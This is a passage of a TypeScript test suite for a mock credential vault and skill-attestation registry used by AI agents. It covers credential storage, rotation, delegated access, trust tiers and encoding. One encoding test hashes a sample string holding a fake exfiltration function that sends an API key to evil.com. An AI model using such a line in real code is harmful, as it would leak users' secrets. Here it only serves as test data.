    // When two notes exist with same keyId, get_credential returns the first
    registry.storeCredential(CAROL, hashKeyId("key"), encodeValue("first"), "f");
    registry.storeCredential(CAROL, hashKeyId("key"), encodeValue("second"), "s");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("key"))!)).toBe("first");
  });

  it("getCredential is a utility call — no on-chain tx needed", () => {
    // In the real contract this is an `unconstrained` function (no proof generated)
    // In our mock it's synchronous — verifying that pattern
    registry.storeCredential(CAROL, hashKeyId("key"), encodeValue("value"), "label");
    const result = registry.getCredential(CAROL, hashKeyId("key"));
    // Should resolve immediately (no async, no tx hash)
    expect(result).not.toBeNull();
  });
});

// ─── CREDENTIAL DELETION ─────────────────────────────────────────────────────

describe("Credential deletion — delete_credential()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("deleted credential returns null on next retrieval", () => {
    registry.storeCredential(CAROL, hashKeyId("temp-key"), encodeValue("temp-secret"), "temp");
    registry.deleteCredential(CAROL, hashKeyId("temp-key"));
    expect(registry.getCredential(CAROL, hashKeyId("temp-key"))).toBeNull();
  });

  it("delete returns a transaction hash (nullifier emitted on-chain)", () => {
    registry.storeCredential(CAROL, hashKeyId("del-key"), encodeValue("del-secret"), "d");
    const txHash = registry.deleteCredential(CAROL, hashKeyId("del-key"));
    expect(txHash).toMatch(/^0x[0-9a-f]{64}$/);
  });

  it("delete removes exactly one note (first matching, leaves duplicates intact)", () => {
    // If two notes exist with same keyId, delete removes only the first
    registry.storeCredential(CAROL, hashKeyId("dup-key"), encodeValue("first"), "f");
    registry.storeCredential(CAROL, hashKeyId("dup-key"), encodeValue("second"), "s");
    expect(registry.getCredentialNoteCount(CAROL)).toBe(2);

    registry.deleteCredential(CAROL, hashKeyId("dup-key"));

    expect(registry.getCredentialNoteCount(CAROL)).toBe(1); // second note remains
    // The second note is now the "first" and will be returned
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("dup-key"))!)).toBe("second");
  });

  it("deleting a non-existent keyId throws", () => {
    expect(() => registry.deleteCredential(CAROL, hashKeyId("nonexistent"))).toThrow(
      "No CredentialNote found",
    );
  });

  it("deleting credential A does not affect credential B", () => {
    registry.storeCredential(CAROL, hashKeyId("keep"), encodeValue("keep-value"), "k");
    registry.storeCredential(CAROL, hashKeyId("delete"), encodeValue("delete-value"), "d");

    registry.deleteCredential(CAROL, hashKeyId("delete"));

    expect(registry.getCredential(CAROL, hashKeyId("delete"))).toBeNull();
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("keep"))!)).toBe("keep-value");
  });

  it("owner's vault is empty after deleting the only credential", () => {
    registry.storeCredential(CAROL, hashKeyId("only-key"), encodeValue("only-secret"), "only");
    expect(registry.getCredentialNoteCount(CAROL)).toBe(1);

    registry.deleteCredential(CAROL, hashKeyId("only-key"));

    expect(registry.getCredentialNoteCount(CAROL)).toBe(0);
  });

  it("cannot delete a credential belonging to a different owner", () => {
    registry.storeCredential(ALICE, hashKeyId("alice-key"), encodeValue("alice-secret"), "A");
    // CAROL tries to delete ALICE's credential — no note in CAROL's PrivateSet for this key
    expect(() => registry.deleteCredential(CAROL, hashKeyId("alice-key"))).toThrow(
      "No CredentialNote found",
    );
    // ALICE's credential is unaffected
    expect(decodeValue(registry.getCredential(ALICE, hashKeyId("alice-key"))!)).toBe("alice-secret");
  });
});

// ─── CREDENTIAL ROTATION ─────────────────────────────────────────────────────

describe("Credential rotation — rotate_credential()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("rotated credential returns new value", () => {
    registry.storeCredential(CAROL, hashKeyId("api-key"), encodeValue("old-v1"), "v1");
    registry.rotateCredential(CAROL, hashKeyId("api-key"), encodeValue("new-v2"), "v2");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("api-key"))!)).toBe("new-v2");
  });

  it("old value is inaccessible after rotation (nullifier emitted)", () => {
    registry.storeCredential(CAROL, hashKeyId("rot-key"), encodeValue("old-secret"), "old");
    registry.rotateCredential(CAROL, hashKeyId("rot-key"), encodeValue("new-secret"), "new");
    // Only one note should exist after rotation (old is nullified, new is inserted)
    expect(registry.getCredentialNoteCount(CAROL)).toBe(1);
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("rot-key"))!)).not.toBe("old-secret");
  });

  it("returns a transaction hash", () => {
    registry.storeCredential(CAROL, hashKeyId("rot2"), encodeValue("v1"), "v1");
    const txHash = registry.rotateCredential(CAROL, hashKeyId("rot2"), encodeValue("v2"), "v2");
    expect(txHash).toMatch(/^0x[0-9a-f]{64}$/);
  });

  it("rotation on a non-existent keyId throws", () => {
    expect(() =>
      registry.rotateCredential(CAROL, hashKeyId("nonexistent"), encodeValue("val"), "label"),
    ).toThrow("No CredentialNote found");
  });

  it("rotation is atomic — note count unchanged (old nullified, new inserted)", () => {
    registry.storeCredential(CAROL, hashKeyId("atomic-key"), encodeValue("v1"), "v1");
    expect(registry.getCredentialNoteCount(CAROL)).toBe(1);
    registry.rotateCredential(CAROL, hashKeyId("atomic-key"), encodeValue("v2"), "v2");
    expect(registry.getCredentialNoteCount(CAROL)).toBe(1); // still exactly 1 note
  });

  it("other credentials unaffected by rotation", () => {
    registry.storeCredential(CAROL, hashKeyId("rotate-me"), encodeValue("r-v1"), "rv1");
    registry.storeCredential(CAROL, hashKeyId("keep-me"), encodeValue("k-val"), "k");

    registry.rotateCredential(CAROL, hashKeyId("rotate-me"), encodeValue("r-v2"), "rv2");

    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("rotate-me"))!)).toBe("r-v2");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("keep-me"))!)).toBe("k-val");
  });

  it("multiple sequential rotations work correctly", () => {
    registry.storeCredential(CAROL, hashKeyId("seq-key"), encodeValue("v1"), "v1");
    registry.rotateCredential(CAROL, hashKeyId("seq-key"), encodeValue("v2"), "v2");
    registry.rotateCredential(CAROL, hashKeyId("seq-key"), encodeValue("v3"), "v3");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("seq-key"))!)).toBe("v3");
    expect(registry.getCredentialNoteCount(CAROL)).toBe(1); // always exactly 1
  });
});

// ─── AUTHWIT DELEGATION ───────────────────────────────────────────────────────

describe("AuthWit delegation — get_credential_for_skill()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("owner can self-access credential with nonce=0 (no authwit required)", () => {
    registry.storeCredential(CAROL, hashKeyId("self-key"), encodeValue("self-secret"), "self");
    const result = registry.getCredentialForSkill(
      CAROL,            // caller = owner
      CAROL,            // owner
      hashKeyId("self-key"),
      0n,               // nonce = 0 → bypass authwit check
    );
    expect(decodeValue(result)).toBe("self-secret");
  });

  it("delegated skill reads credential with a valid authwit", () => {
    registry.storeCredential(CAROL, hashKeyId("delegate-key"), encodeValue("github-token"), "GH");
    const nonce = 12345n;
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("delegate-key"), nonce);

    const result = registry.getCredentialForSkill(
      DAVE, CAROL, hashKeyId("delegate-key"), nonce,
    );
    expect(decodeValue(result)).toBe("github-token");
  });

  it("authwit is single-use — second call with same nonce fails", () => {
    registry.storeCredential(CAROL, hashKeyId("su-key"), encodeValue("secret"), "SU");
    const nonce = 99999n;
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("su-key"), nonce);

    // First use succeeds
    registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("su-key"), nonce);
    // Second use fails — authwit consumed
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("su-key"), nonce),
    ).toThrow("AuthWit already consumed");
  });

  it("unauthorized caller without authwit is rejected", () => {
    registry.storeCredential(CAROL, hashKeyId("guarded-key"), encodeValue("top-secret"), "G");
    // DAVE tries to read without an authwit from CAROL
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("guarded-key"), 1n),
    ).toThrow("no valid AuthWit");
  });

  it("scope isolation: authwit for key-A cannot access key-B", () => {
    registry.storeCredential(CAROL, hashKeyId("allowed-key"), encodeValue("allowed"), "A");
    registry.storeCredential(CAROL, hashKeyId("forbidden-key"), encodeValue("forbidden"), "F");
    const nonce = 777n;
    // Grant access to allowed-key only
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("allowed-key"), nonce);

    // DAVE can read allowed-key
    const allowed = registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("allowed-key"), nonce);
    expect(decodeValue(allowed)).toBe("allowed");

    // DAVE cannot read forbidden-key with the same nonce (different keyId — no matching authwit)
    const nonce2 = 778n;
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("allowed-key"), nonce2);
    // authwit is for allowed-key, not forbidden-key
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("forbidden-key"), nonce2),
    ).toThrow("no valid AuthWit");
  });

  it("authwit is caller-specific: a different caller cannot use it", () => {
    registry.storeCredential(CAROL, hashKeyId("caller-bound"), encodeValue("secret"), "CB");
    const nonce = 42n;
    // Grant access to DAVE specifically
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("caller-bound"), nonce);

    // BOB (different caller) cannot use DAVE's authwit
    expect(() =>
      registry.getCredentialForSkill(BOB, CAROL, hashKeyId("caller-bound"), nonce),
    ).toThrow("no valid AuthWit");
  });

  it("reading a missing credential via delegation throws", () => {
    // Grant authwit for a keyId that doesn't have a note stored
    const nonce = 1n;
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("missing-key"), nonce);
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("missing-key"), nonce),
    ).toThrow("No CredentialNote found");
  });

  it("multiple delegations with different nonces work independently", () => {
    registry.storeCredential(CAROL, hashKeyId("multi-nonce"), encodeValue("value"), "MN");
    // Grant two separate authwits (e.g., for two different access windows)
    const nonce1 = 1001n;
    const nonce2 = 1002n;
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("multi-nonce"), nonce1);
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("multi-nonce"), nonce2);

    // Both can be used independently
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("multi-nonce"), nonce1),
    ).not.toThrow();
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("multi-nonce"), nonce2),
    ).not.toThrow();
  });
});

// ─── MULTI-AGENT INDEPENDENCE ────────────────────────────────────────────────

describe("Multi-agent independence", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("attestation tracks are independent per auditor", () => {
    const h1 = makeSkillHash("agent-skill-1");
    const h2 = makeSkillHash("agent-skill-2");

    registry.attest(ALICE, h1, 80, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h2, 90, ClaimType.BEHAVIORAL);

    expect(registry.getAuditorNoteCount(ALICE)).toBe(1);
    expect(registry.getAuditorNoteCount(BOB)).toBe(1);
    // Alice has no note for h2
    expect(() => registry.revokeAttestation(ALICE, h2)).toThrow("No AttestationNote found");
    // Bob has no note for h1
    expect(() => registry.revokeAttestation(BOB, h1)).toThrow("No AttestationNote found");
  });

  it("credential vaults are fully isolated per owner", () => {
    registry.storeCredential(ALICE, hashKeyId("key"), encodeValue("alice-val"), "A");
    registry.storeCredential(BOB, hashKeyId("key"), encodeValue("bob-val"), "B");
    registry.storeCredential(CAROL, hashKeyId("key"), encodeValue("carol-val"), "C");

    expect(decodeValue(registry.getCredential(ALICE, hashKeyId("key"))!)).toBe("alice-val");
    expect(decodeValue(registry.getCredential(BOB, hashKeyId("key"))!)).toBe("bob-val");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("key"))!)).toBe("carol-val");
  });

  it("trust scores are global — all agents read the same public state", () => {
    const h = makeSkillHash("global-trust-skill");

    // Alice and Bob are auditors
    registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h, 70, ClaimType.BEHAVIORAL);

    // Any agent can query the same public trust score
    // (no wallet required for getTrustScore in the real contract)
    expect(registry.getTrustScore(h)).toBe(155n);
    expect(registry.getAttestationCount(h)).toBe(2n);
  });

  it("deleting one agent's credential does not affect another's", () => {
    registry.storeCredential(ALICE, hashKeyId("shared-name"), encodeValue("alice"), "A");
    registry.storeCredential(BOB, hashKeyId("shared-name"), encodeValue("bob"), "B");

    registry.deleteCredential(ALICE, hashKeyId("shared-name"));

    expect(registry.getCredential(ALICE, hashKeyId("shared-name"))).toBeNull();
    expect(decodeValue(registry.getCredential(BOB, hashKeyId("shared-name"))!)).toBe("bob");
  });
});

// ─── END-TO-END SCENARIO TESTS ───────────────────────────────────────────────

describe("End-to-end scenarios", () => {
  it("full agent security lifecycle: attest, install-check, store cred, revoke on compromise", () => {
    const registry = new MockIsnadRegistry();

    // Scenario: Alice audits a weather skill. Bob installs it.
    // Later, Alice discovers it was compromised. She revokes.

    const skillContent = "export async function getWeather(loc) { return fetch(url); }";
    const skillHash = makeSkillHash(skillContent);

    // Step 1: Alice audits and attests (code_review tier)
    registry.attest(ALICE, skillHash, 88, ClaimType.CODE_REVIEW);
    expect(registry.getTrustScore(skillHash)).toBe(88n);

    // Step 2: Bob checks trust score before installing
    const score = registry.getTrustScore(skillHash);
    const count = registry.getAttestationCount(skillHash);
    expect(score).toBeGreaterThan(0n);
    expect(count).toBe(1n);
    // Bob decides to install (score > 50 is his threshold)

    // Step 3: Bob stores his OpenAI key in the vault
    const SECRET = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu";
    registry.storeCredential(BOB, hashKeyId("openai"), encodeValue(SECRET), "OpenAI Key");
    expect(decodeValue(registry.getCredential(BOB, hashKeyId("openai"))!)).toBe(SECRET);

    // Step 4: Alice discovers the skill was compromised — she revokes
    registry.revokeAttestation(ALICE, skillHash);
    expect(registry.getTrustScore(skillHash)).toBe(0n);
    expect(registry.getAttestationCount(skillHash)).toBe(0n);

    // Step 5: Bob sees score dropped to 0 — he deletes the delegation if any existed
    // (Bob's credential is still safe — it's in his private vault)
    expect(decodeValue(registry.getCredential(BOB, hashKeyId("openai"))!)).toBe(SECRET);
  });

  it("trust building to TRUSTED tier: 3+ auditors, combined score >= 150", () => {
    const registry = new MockIsnadRegistry();
    const h = makeSkillHash("trusted-tier-skill content");

    registry.attest(ALICE, h, 90, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h, 85, ClaimType.BEHAVIORAL);
    registry.attest(CAROL, h, 92, ClaimType.SANDBOXED_EXECUTION);

    const score = registry.getTrustScore(h);
    const count = registry.getAttestationCount(h);

    expect(count).toBeGreaterThanOrEqual(3n);
    expect(score).toBeGreaterThanOrEqual(150n);

    // Matches clawde.co trust level classification
    const trustLevel =
      count === 0n ? "UNSCORED" :
      count < 3n || score < 150n ? "EMERGING" :
      count < 10n || score < 500n ? "TRUSTED" :
      "ESTABLISHED";
    expect(trustLevel).toBe("TRUSTED");
  });

  it("credential delegation flow: agent grants skill access to one key", () => {
    const registry = new MockIsnadRegistry();

    // Carol is an agent; Dave is a skill contract
    const GITHUB_SECRET = "ghp_" + "a".repeat(36);
    const OPENAI_SECRET = "sk-proj-" + "b".repeat(48);

    // Carol stores two credentials
    registry.storeCredential(CAROL, hashKeyId("github"), encodeValue(GITHUB_SECRET), "GitHub PAT");
    registry.storeCredential(CAROL, hashKeyId("openai"), encodeValue(OPENAI_SECRET), "OpenAI");

    // Carol grants Dave access to github only
    const nonce = BigInt(Date.now());
    registry.grantCredentialAccess(CAROL, DAVE, hashKeyId("github"), nonce);

    // Dave reads github — succeeds
    const githubResult = registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("github"), nonce);
    expect(decodeValue(githubResult)).toBe(GITHUB_SECRET);

    // Dave attempts to read openai — fails (no authwit)
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("openai"), nonce + 1n),
    ).toThrow("no valid AuthWit");

    // Dave tries to re-use the github nonce — fails (single-use)
    expect(() =>
      registry.getCredentialForSkill(DAVE, CAROL, hashKeyId("github"), nonce),
    ).toThrow("AuthWit already consumed");
  });

  it("genesis auditor set: three auditor types, each attests with their claim type", () => {
    const registry = new MockIsnadRegistry();

    // Simulates the genesis attestor set (kobold-scan, HK47, syntrax)
    const KOBOLD_SCAN = "0x" + "1".repeat(64); // code_review
    const HK47 = "0x" + "2".repeat(64);        // behavioral
    const SYNTRAX = "0x" + "3".repeat(64);     // sandboxed_execution

    const h = makeSkillHash("genesis-skill content");

    registry.attest(KOBOLD_SCAN, h, 82, ClaimType.CODE_REVIEW);
    registry.attest(HK47, h, 78, ClaimType.BEHAVIORAL);
    registry.attest(SYNTRAX, h, 95, ClaimType.SANDBOXED_EXECUTION);

    // Public state: aggregate only
    expect(registry.getTrustScore(h)).toBe(255n);
    expect(registry.getAttestationCount(h)).toBe(3n);

    // Private state: each auditor's claim_type is only in their own PXE
    expect(registry.getAuditorClaimTypes(KOBOLD_SCAN)).toEqual([ClaimType.CODE_REVIEW]);
    expect(registry.getAuditorClaimTypes(HK47)).toEqual([ClaimType.BEHAVIORAL]);
    expect(registry.getAuditorClaimTypes(SYNTRAX)).toEqual([ClaimType.SANDBOXED_EXECUTION]);
  });
});

// ─── SINGLE-USE CLAIM PERMANENCE ─────────────────────────────────────────────
//
// SingleUseClaim emits a nullifier that is PERMANENT — it cannot be un-spent.
// This has one important implication: after an auditor revokes their attestation,
// they CANNOT re-attest the same skill. This is by design:
//   - Revocation is a high-stakes action (signals compromise)
//   - Re-attestation after revocation would bypass the "you only get one shot"
//     invariant and allow gaming by revoking + re-attesting for a fresh score bump
//   - If an auditor legitimately wants to re-attest, they would need a new identity
// This behavior should be explicitly understood by anyone building on the protocol.

describe("SingleUseClaim permanence — revoke-then-re-attest is impossible", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("revoked attestation cannot be re-attested by the same auditor", () => {
    const h = makeSkillHash("once-and-done-skill");

    // Alice attests
    registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    expect(registry.getTrustScore(h)).toBe(85n);

    // Alice discovers compromise and revokes
    registry.revokeAttestation(ALICE, h);
    expect(registry.getTrustScore(h)).toBe(0n);

    // Alice cannot re-attest (SingleUseClaim nullifier is permanent)
    expect(() => registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW)).toThrow(
      "SingleUseClaim already consumed",
    );
    // Score remains 0 — no second attestation possible
    expect(registry.getTrustScore(h)).toBe(0n);
    expect(registry.getAttestationCount(h)).toBe(0n);
  });

  it("revoke-then-re-attest is blocked even with a different claimType", () => {
    const h = makeSkillHash("claim-type-change-skill");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);
    // Trying with a different claim type — still blocked (same auditor+skill key)
    expect(() => registry.attest(ALICE, h, 80, ClaimType.SANDBOXED_EXECUTION)).toThrow(
      "SingleUseClaim already consumed",
    );
  });

  it("a second auditor CAN re-attest a revoked skill", () => {
    const h = makeSkillHash("recoverable-skill");

    // Alice attests then revokes
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);
    expect(registry.getTrustScore(h)).toBe(0n);

    // Bob (fresh identity) can still attest — no claim spent for BOB+h
    expect(() => registry.attest(BOB, h, 90, ClaimType.BEHAVIORAL)).not.toThrow();
    expect(registry.getTrustScore(h)).toBe(90n);
    expect(registry.getAttestationCount(h)).toBe(1n);
  });

  it("revocation does not release the claim — it is permanently consumed", () => {
    const h = makeSkillHash("claim-permanent-skill");
    registry.attest(ALICE, h, 75, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);

    // After revocation, Alice's attest_claims entry for this skill is still spent
    // (the SingleUseClaim nullifier cannot be "un-emitted")
    // The only action Alice can take regarding this skill is... nothing.
    expect(registry.getAuditorNoteCount(ALICE)).toBe(0);
    expect(() => registry.attest(ALICE, h, 75, ClaimType.CODE_REVIEW)).toThrow(
      "SingleUseClaim already consumed",
    );
    expect(() => registry.revokeAttestation(ALICE, h)).toThrow("No AttestationNote found");
  });
});

// ─── AUTHWIT EDGE CASES: OWNER SELF-CALL GUARD ───────────────────────────────
//
// The self-call bypass (no authwit required) ONLY applies when BOTH:
//   1. callerAddress === ownerAddress
//   2. nonce === 0n
// If the owner calls with nonce != 0, they are NOT treated as a self-call
// and an authwit is required. This prevents nonce confusion and ensures
// the authorization path is explicit.

describe("AuthWit — owner non-zero nonce requires authwit", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("owner with nonce=0 always bypasses authwit check (self-call)", () => {
    registry.storeCredential(CAROL, hashKeyId("self-zero"), encodeValue("val"), "v");
    // nonce=0 + caller=owner → self-call bypass
    expect(() =>
      registry.getCredentialForSkill(CAROL, CAROL, hashKeyId("self-zero"), 0n),
    ).not.toThrow();
  });

  it("owner with nonce != 0 is NOT treated as self-call — requires authwit", () => {
    registry.storeCredential(CAROL, hashKeyId("self-nonzero"), encodeValue("val"), "v");
    // nonce=1 even though caller=owner — not a self-call
    expect(() =>
      registry.getCredentialForSkill(CAROL, CAROL, hashKeyId("self-nonzero"), 1n),
    ).toThrow("no valid AuthWit");
  });

  it("owner can grant themselves an authwit with non-zero nonce and use it", () => {
    registry.storeCredential(CAROL, hashKeyId("self-authwit"), encodeValue("val"), "v");
    const nonce = 42n;
    // Carol grants herself an authwit (e.g., for a scheduled job that calls as CAROL)
    registry.grantCredentialAccess(CAROL, CAROL, hashKeyId("self-authwit"), nonce);
    // Now the call succeeds
    const result = registry.getCredentialForSkill(CAROL, CAROL, hashKeyId("self-authwit"), nonce);
    expect(decodeValue(result)).toBe("val");
  });

  it("owner self-authwit is still single-use", () => {
    registry.storeCredential(CAROL, hashKeyId("self-su"), encodeValue("val"), "v");
    const nonce = 99n;
    registry.grantCredentialAccess(CAROL, CAROL, hashKeyId("self-su"), nonce);
    registry.getCredentialForSkill(CAROL, CAROL, hashKeyId("self-su"), nonce);
    expect(() =>
      registry.getCredentialForSkill(CAROL, CAROL, hashKeyId("self-su"), nonce),
    ).toThrow("AuthWit already consumed");
  });
});

// ─── CREDENTIAL CAPACITY: OVERFLOW TRUNCATION ────────────────────────────────
//
// The CredentialNote.value field is [Field; 4], where each Field holds 31 bytes.
// Total capacity: 4 × 31 = 124 bytes.
//
// encodeValue() silently truncates inputs longer than 124 bytes — bytes 124+ are
// lost. This is a known design limitation: callers MUST ensure values fit within
// 124 bytes before calling store_credential(). The SDK documents this limit.
//
// Users attempting to store longer values will get a truncated credential back.
// This should be caught at the UI layer (max-length validation) rather than
// surfaced as a contract-level error.

describe("Credential capacity — overflow truncation at 124 bytes", () => {
  it("value of exactly 124 bytes stores and retrieves without loss", () => {
    const v = "X".repeat(124);
    expect(decodeValue(encodeValue(v))).toBe(v);
    expect(decodeValue(encodeValue(v)).length).toBe(124);
  });

  it("value of 125 bytes is silently truncated to 124 bytes on encode", () => {
    const v = "A".repeat(124) + "Z"; // 125 chars: last 'Z' is beyond capacity
    const encoded = encodeValue(v);
    const decoded = decodeValue(encoded);
    // The trailing 'Z' is dropped
    expect(decoded.length).toBe(124);
    expect(decoded).toBe("A".repeat(124));
    expect(decoded).not.toContain("Z");
  });

  it("value of 200 bytes stores only the first 124 bytes", () => {
    // First 62 bytes are 'A', next 62 are 'B', next 76 are 'C'
    // After truncation, we expect 62 'A's + 62 'B's (= 124 total; the 'C' block is dropped)
    const v = "A".repeat(62) + "B".repeat(62) + "C".repeat(76); // 200 chars
    const decoded = decodeValue(encodeValue(v));
    expect(decoded.length).toBe(124);
    expect(decoded).toBe("A".repeat(62) + "B".repeat(62));
    expect(decoded).not.toContain("C");
  });

  it("values at the 31-byte boundary (field boundary) encode exactly", () => {
    // 31 bytes = exactly one Field
    const v31 = "B".repeat(31);
    expect(decodeValue(encodeValue(v31))).toBe(v31);

    // 32 bytes = first Field (31) + 1 byte in second Field
    const v32 = "C".repeat(32);
    expect(decodeValue(encodeValue(v32))).toBe(v32);
  });
});

// ─── TRUST LEVEL TIERS ───────────────────────────────────────────────────────
//
// Trust level thresholds (from INTEGRATION.md and clawde.co integration spec):
//   UNSCORED:    count === 0
//   EMERGING:    count < 3 OR score < 150
//   TRUSTED:     count >= 3 AND score >= 150 AND (count < 10 OR score < 500)
//   ESTABLISHED: count >= 10 AND score >= 500

describe("Trust level tier boundaries", () => {
  function classifyTrustLevel(score: bigint, count: bigint): string {
    if (count === 0n) return "UNSCORED";
    if (count < 3n || score < 150n) return "EMERGING";
    if (count < 10n || score < 500n) return "TRUSTED";
    return "ESTABLISHED";
  }

  it("zero attestations = UNSCORED", () => {
    expect(classifyTrustLevel(0n, 0n)).toBe("UNSCORED");
  });

  it("1 attestation, low score = EMERGING", () => {
    expect(classifyTrustLevel(80n, 1n)).toBe("EMERGING");
  });

  it("2 attestations, score >= 150 = still EMERGING (count < 3)", () => {
    expect(classifyTrustLevel(200n, 2n)).toBe("EMERGING");
  });

  it("3 attestations, score >= 150 = TRUSTED", () => {
    expect(classifyTrustLevel(150n, 3n)).toBe("TRUSTED");
  });

  it("9 attestations, high score = still TRUSTED (count < 10)", () => {
    expect(classifyTrustLevel(800n, 9n)).toBe("TRUSTED");
  });

  it("10 attestations, score >= 500 = ESTABLISHED", () => {
    expect(classifyTrustLevel(500n, 10n)).toBe("ESTABLISHED");
  });

  it("contract state reaches ESTABLISHED tier with 10 auditors at quality >= 50", () => {
    const registry = new MockIsnadRegistry();
    const auditors = Array.from({ length: 10 }, (_, i) => "0x" + i.toString().padStart(64, "0"));
    const h = makeSkillHash("established-skill content for genesis");

    for (const addr of auditors) {
      registry.attest(addr, h, 55, ClaimType.CODE_REVIEW); // 10 × 55 = 550
    }

    const score = registry.getTrustScore(h);
    const count = registry.getAttestationCount(h);
    expect(count).toBe(10n);
    expect(score).toBe(550n);
    expect(classifyTrustLevel(score, count)).toBe("ESTABLISHED");
  });

  it("ClawHavoc malicious skill reaches zero score after all attestations revoked", () => {
    const registry = new MockIsnadRegistry();
    const auditors = [ALICE, BOB, CAROL];
    const h = makeSkillHash("malicious-skill-discovered-by-clawhavoc");

    // Initially attested (before discovery)
    for (const addr of auditors) {
      registry.attest(addr, h, 60, ClaimType.CODE_REVIEW);
    }
    expect(registry.getTrustScore(h)).toBe(180n);

    // All auditors revoke after malicious behavior discovered
    for (const addr of auditors) {
      registry.revokeAttestation(addr, h);
    }
    expect(registry.getTrustScore(h)).toBe(0n);
    expect(registry.getAttestationCount(h)).toBe(0n);
    expect(classifyTrustLevel(0n, 0n)).toBe("UNSCORED");
  });
});

// ─── ENCODING EDGE CASES ─────────────────────────────────────────────────────

describe("Field encoding edge cases", () => {
  it("skill hash stays within BN254 field for any input", () => {
    const BN254_P = 21888242871839275222246405745257275088548364400416034343698204186575808495617n;
    const inputs = [
      "", "a", "A".repeat(100), "\x00\xff\x80",
      "function exfiltrate() { fetch('https://evil.com/' + apiKey); }",
    ];
    for (const input of inputs) {
      const hash = IsnadSDK.computeSkillHash(new TextEncoder().encode(input));
      expect(hash.toBigInt()).toBeLessThan(BN254_P);
    }
  });

  it("computeSkillHash is stable — same content always same hash", () => {
    const content = new TextEncoder().encode("stable-content-test");
    const h1 = IsnadSDK.computeSkillHash(content);
    const h2 = IsnadSDK.computeSkillHash(content);
    expect(h1.toBigInt()).toBe(h2.toBigInt());
  });

  it("any byte change in skill content changes the hash", () => {
    const v1 = IsnadSDK.computeSkillHash(new TextEncoder().encode("skill v1"));
    const v2 = IsnadSDK.computeSkillHash(new TextEncoder().encode("skill v2"));
    expect(v1.toBigInt()).not.toBe(v2.toBigInt());
  });

  it("credential value encodes and decodes a 62-byte string exactly", () => {
    const v = "A".repeat(62); // exactly 2 full fields
    expect(decodeValue(encodeValue(v))).toBe(v);
  });

  it("credential value encodes and decodes a 1-byte string exactly", () => {
    expect(decodeValue(encodeValue("x"))).toBe("x");
  });

  it("two different keyIds produce different hash values", () => {
    const k1 = hashKeyId("openai-api-key");
    const k2 = hashKeyId("github-token");
    expect(k1).not.toBe(k2);
  });

  it("same keyId string always hashes to same value (deterministic)", () => {
    expect(hashKeyId("my-key")).toBe(hashKeyId("my-key"));
  });
});
